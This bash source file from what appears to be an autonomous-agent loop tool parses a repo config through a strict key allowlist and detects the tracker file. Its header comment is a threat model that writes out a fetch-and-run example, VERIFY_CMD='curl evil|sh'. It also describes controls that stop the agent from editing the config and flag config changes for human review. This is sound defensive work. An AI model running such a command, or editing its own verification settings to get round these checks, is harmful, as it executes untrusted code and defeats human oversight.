# =============================================================================
#  contract.sh — the repo contract: PARSED config + tracker detection
# =============================================================================
#  SECURITY INVARIANT (the single most important rule in ratchet):
#   the loop `eval`s VERIFY_CMD, and an autonomous agent can edit repo files. If
#   the repo config were bash-SOURCED, anything landing in the repo could write
#   `VERIFY_CMD='curl evil|sh'` and the loop — outside any agent permission
#   model — would execute it next turn. Therefore .ratchet.conf is READ by an
#   allowlisted parser: read a line, match ^[A-Z_]+=, accept ONLY known keys,
#   strip surrounding quotes. No `source`, no `eval`, ever. Anything else is a
#   doctor error. The protocol block also FORBIDS the agent from editing
#   .ratchet.conf, and the commit gate rejects any turn that touches it.
#
#  Precedence (highest wins):  CLI flags  >  repo .ratchet.conf (parsed)  >
#                              global conf (sourced; trusted; not agent-writable)  >  defaults.
# =============================================================================

# The complete allowlist. A key not on this list in .ratchet.conf => doctor error.
CONTRACT_KEYS="MODELS TURN_TIMEOUT STALL_TIMEOUT SHORT_SLEEP MAX_TRANSIENT COOLDOWN BOTH_WAIT \
STEP_TOKEN DONE_TOKEN AGENT_CMD COMMIT_EACH_TURN COMMIT_VERIFY_GATE VERIFY_CMD \
PUSH_ON_DONE OPEN_PR APPROVE_UI COMMIT_EXCLUDE_GLOBS ALLOWED_PROVIDERS THINKING \
RESUME_SESSION CACHE_RETENTION SANITIZE_THINKING QUIET TAIL_LINES HEARTBEAT \
STREAM_AGENT TRACKER_FILE RATCHET_PROTOCOL PLAN_MODELS BUILD_MODELS LIGHT_MODELS \
THINKING_PLAN THINKING_BUILD THINKING_LIGHT FANOUT REQUIRED_TOOLS REVIEW_MODELS \
THINKING_REVIEW MODEL_RANK MAX_REVIEW_CYCLES PR_CADENCE MERGE_POLL_SECS \
MERGE_WAIT_TIMEOUT PR_SOFT_MAX_LINES"

_key_allowed() {  # _key_allowed KEY -> 0 if in allowlist
  local k="$1" kk
  for kk in $CONTRACT_KEYS; do [ "$kk" = "$k" ] && return 0; done
  return 1
}

# parse_repo_conf FILE  -> sets the allowlisted globals from the repo contract.
# Returns 1 and fills RATCHET_CONF_ERRORS if any line is malformed/unknown.
# Comments (#) and blank lines are ignored. Quoted values have quotes stripped.
RATCHET_CONF_ERRORS=""
parse_repo_conf() {
  local file="$1" lineno=0 line key val errors=""
  [ -n "$file" ] && [ -f "$file" ] || { RATCHET_CONF_ERRORS=""; return 0; }
  while IFS= read -r line || [ -n "$line" ]; do
    lineno=$((lineno + 1))
    # strip a trailing comment only when # is preceded by whitespace or start
    line="${line%%#*}"
    [ -n "${line// }" ] || continue                       # blank / comment-only
    # match  KEY=...  (key is uppercase letters/digits/underscore)
    case "$line" in
      [A-Z_]*=*)
        key="${line%%=*}"
        val="${line#*=}"
        if ! _key_allowed "$key"; then
          errors="$errors\n  line $lineno: unknown key '$key' (not in allowlist)"
          continue
        fi
        # strip one layer of surrounding quotes
        case "$val" in
          \"*\") val="${val#\"}"; val="${val%\"}" ;;
          \'*\') val="${val#\'}"; val="${val%\'}" ;;
        esac
        # numeric keys: validate digits (defense; the loop still treats as string)
        case "$key" in
          TURN_TIMEOUT|STALL_TIMEOUT|SHORT_SLEEP|MAX_TRANSIENT|COOLDOWN|BOTH_WAIT|TAIL_LINES|HEARTBEAT|\
          COMMIT_EACH_TURN|COMMIT_VERIFY_GATE|PUSH_ON_DONE|OPEN_PR|APPROVE_UI|\
          RESUME_SESSION|SANITIZE_THINKING|QUIET|STREAM_AGENT|RATCHET_PROTOCOL|\
          MAX_REVIEW_CYCLES|MERGE_POLL_SECS|MERGE_WAIT_TIMEOUT|PR_SOFT_MAX_LINES)
            val="${val//[!0-9]/}"; val="${val:-0}" ;;
        esac
        # export so child agent-cmd inherits none of this (it's loop-private);
        # we just assign to the global of the same name via eval of a safe token.
        eval "$key=\"\$val\""   # $key is allowlist-validated, $val is the data
        ;;
      *) errors="$errors\n  line $lineno: not a KEY=value line: '$line'" ;;
    esac
  done < "$file"
  RATCHET_CONF_ERRORS="$(printf '%b' "$errors")"
  [ -z "$RATCHET_CONF_ERRORS" ]
}

# detect_tracker_file DIR -> echoes the tracker path (PLAN.md > TODO.md > TASKS.md),
# or empty if none exist (doctor will flag it).
detect_tracker_file() {
  local dir="$1" f
  for f in PLAN.md TODO.md TASKS.md; do
    [ -f "$dir/$f" ] && { printf '%s' "$f"; return 0; }
  done
  printf ''
}

# conf_hash FILE -> a stable hash of the repo contract (doctor pins it so a
# changed contract is surfaced for human acknowledgment at the next run).
conf_hash() { [ -f "$1" ] && shasum -a 256 "$1" 2>/dev/null | awk '{print $1}' || printf 'none'; }
